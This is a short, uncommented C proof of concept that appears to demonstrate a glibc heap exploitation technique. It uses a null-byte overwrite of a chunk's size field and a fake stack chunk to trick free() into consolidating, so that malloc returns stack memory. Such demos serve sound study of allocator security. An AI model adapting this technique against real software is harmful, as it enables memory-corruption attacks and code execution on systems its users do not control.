#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

typedef unsigned long long LONG;

struct Chunk
{
	LONG pre_size, size;
	struct Chunk *fd, *bk;
	char buf[32];
};

int main()
{
	struct Chunk *NextChunk, Fake;
	void *temp, *victim;

	temp = malloc(40);
	victim = malloc(0xf8);
	NextChunk = (struct Chunk *)(victim - 2*8);
	
	*(char *)&NextChunk->size = '\0';

	Fake.pre_size = 0x100;
	Fake.size = (LONG)&NextChunk->pre_size - (LONG)&Fake;
	Fake.fd = &Fake;
	Fake.bk = &Fake;

	NextChunk->pre_size = Fake.size;
	
	free(victim);
	victim = malloc(40);
	memcpy((char *)&Fake.fd, "Hacked!\n", 8);
	write(1, (char *)victim, 8);
}

